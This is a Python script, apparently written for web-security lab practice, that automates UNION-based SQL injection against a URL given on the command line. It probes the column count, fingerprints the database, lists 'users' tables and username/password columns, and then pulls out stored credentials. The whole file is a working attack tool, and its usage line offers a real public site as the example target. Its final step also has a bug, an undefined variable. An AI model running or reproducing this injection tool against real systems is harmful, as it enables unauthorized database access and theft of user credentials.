import re
import sys
import urllib.parse

import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

DB = None
COMMENTS = None
NUMBER_OF_COLUMN = None


def find_number_of_columns(base_url):
    global COMMENTS
    sql_comments = ["--", "#", "/*", "-- "]
    sql_version = ["Any", "MySQL(1)", "All except ORACLE", "MySQL(2)"]
    num_of_col = 0
    max_num_col = 0
    comment_index = 0
    for index, comment in enumerate(sql_comments):
        num_of_col = 0
        for i in range(1, 50):
            uri = f"'ORDER BY {i} {comment}"
            # print(uri)
            r = requests.get(base_url + uri, proxies=proxies, verify=False, timeout=5)
            if r.status_code != 200:
                num_of_col = i - 1
                if num_of_col > max_num_col:
                    max_num_col = num_of_col
                    comment_index = index
                break
        if max_num_col > 0:
            print(
                f"{Fore.GREEN}[+] Number of columns: {max_num_col}{Fore.RESET}, : {sql_version[comment_index]}"
            )
            COMMENTS = sql_comments[comment_index]
    return max_num_col


def exploit_sqli_column_text(base_url, num_of_col):
    found = 0
    payload = "'a'"
    for i in range(num_of_col):
        variation = ["NULL"] * num_of_col
        variation[i] = payload
        str_variation = ", ".join(variation)
        py = f"' UNION select {str_variation}--"
        if DB == "ORACLE":
            py = f"' UNION select {str_variation} FROM dual--"
        # print(base_url + uri + py)
        # encoded_py = urllib.parse.quote(py)
        r = requests.get(base_url + py, proxies=proxies, verify=False, timeout=5)
        if r.status_code != 200:
            print(f"{Fore.RED}[$] Column {i} is NOT of type text{Fore.RESET}")
            continue
        payload_matches = r.text.find(payload[1:-1])
        if payload_matches != -1:
            print(f"{Fore.GREEN}[%] Column {i} is of type text{Fore.RESET}")
            found += 1

    if found:
        return True
    return False


def find_sql_version(base_url, num_of_col):
    global DB
    payloads = [
        "banner FROM v$version",
        "version FROM v$instance",
        "@@version",
        "version()",
    ]
    versions = ["ORACLE", "ORACLE", "MSTF OR MySQL", "POSTGRES"]
    print(f"comments: { COMMENTS}")
    for index, payload in enumerate(payloads):
        variation = ["NULL"] * num_of_col
        variation[num_of_col - 1] = payload
        str_variation = ", ".join(variation)
        py = f"' UNION select {str_variation}{COMMENTS}"
        print(base_url + py)
        encoded_py = urllib.parse.quote(py)
        print(base_url + encoded_py)
        r = requests.get(
            base_url + encoded_py, proxies=proxies, verify=False, timeout=5
        )

        if r.status_code != 200:
            print(f"{Fore.RED}[&] DB is NOT {versions[index]}{Fore.RESET}")
        else:
            DB = versions[index]
            print(f"{Fore.GREEN}[&] DB is {versions[index]}{Fore.RESET}")


def exploit_sqli(base_url):
    global NUMBER_OF_COLUMN
    num_of_col = find_number_of_columns(base_url)
    NUMBER_OF_COLUMN = num_of_col
    print(f"{Fore.GREEN}[+] Number of columns: {num_of_col}{Fore.RESET}")
    if NUMBER_OF_COLUMN:
        find_sql_version(base_url, num_of_col)
        found = exploit_sqli_column_text(base_url, num_of_col)
        if found:
            return num_of_col

    return 0


def find_tables_name(base_url: str, isOra: bool, num_of_col):
    variation = ["NULL"] * num_of_col
    variation[num_of_col - 1] = "table_name"
    str_variation = ", ".join(variation)
    base_queries = [
        f"' UNION SELECT {str_variation} FROM information_schema.tables --",
        f"' UNION SELECT {str_variation} FROM all_tables --",
    ]
    base_querie = base_queries[1] if isOra else base_queries[0]
    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)

    r.raise_for_status()
    print(base_url + base_querie)
    response_content = r.text
    pattern = r"users_\w+"
    matches = re.findall(pattern, response_content)
    for match in matches:
        print(f"{Fore.YELLOW}{match}{Fore.RESET}")
    find_columns_name(base_url, isOra, num_of_col, matches[0])

    return False

def find_columns_name(base_url: str, isOra: bool, num_of_col: int, table_name:str):
    variation = ["NULL"] * num_of_col
    variation[num_of_col - 1] = "column_name"
    str_variation = ", ".join(variation)
    base_queries = [
        f"' UNION SELECT {str_variation} FROM information_schema.columns WHERE table_name = '{table_name}' --",
        f"' UNION SELECT {str_variation} FROM all_tab_columns WHERE table_name = '{table_name}' --",
    ]
    base_querie = base_queries[1] if isOra else base_queries[0]
    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)

    r.raise_for_status()
    print(base_url + base_querie)
    response_content = r.text
    pattern = r"(username|password)_\w+"
    matches = re.findall(pattern, response_content)
    for match in matches:
        print(f"{Fore.YELLOW}{match}{Fore.RESET}")
    a = input("Do you want to find username, password? [y/n]:")
    if a == 'y':
        find_all_users(base_url, isOra, num_of_col, matches[0])

    return False

def find_all_users(base_url: str, isOra: bool, num_of_col: int, column_name:str):
    if (num_of_col) < 2:
        return False
    variation = ["NULL"] * num_of_col
    variation[num_of_col - 2] = "username"
    variation[num_of_col - 1] = "password"
    str_variation = ", ".join(variation)
    base_queries = [
        f"' UNION SELECT {str_variation} FROM {column_name}--",
        f"' UNION SELECT {str_variation} FROM {column_name}--",
    ]
    base_querie = base_queries[1] if isOra else base_queries[0]
    print(base_querie)
    r = requests.get(base_url + base_querie, proxies=proxies, verify=False, timeout=5)

    r.raise_for_status()
    print(base_url + base_querie)
    response_content = r.text
    
    matches = re.findall(pattern, response_content)
    for match in matches:
        print(f"{Fore.YELLOW}{match}{Fore.RESET}")
        

    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f'[-] Example: {sys.argv[0]} www.google.com"')
        sys.exit(-1)

    number_of_columns = exploit_sqli(url)
    if number_of_columns <= 0:
        print("[-] Exploit failed")
    answer = input("Do you want to look for table names? [y/n]: ")
    if answer == "n":
        sys.exit(0)
    answer = input("Is it an Oracle DataBase? [y/n]: ")
    isOracle = False
    if answer == "y":
        isOracle = True
    find_tables_name(url, isOracle, NUMBER_OF_COLUMN)
    
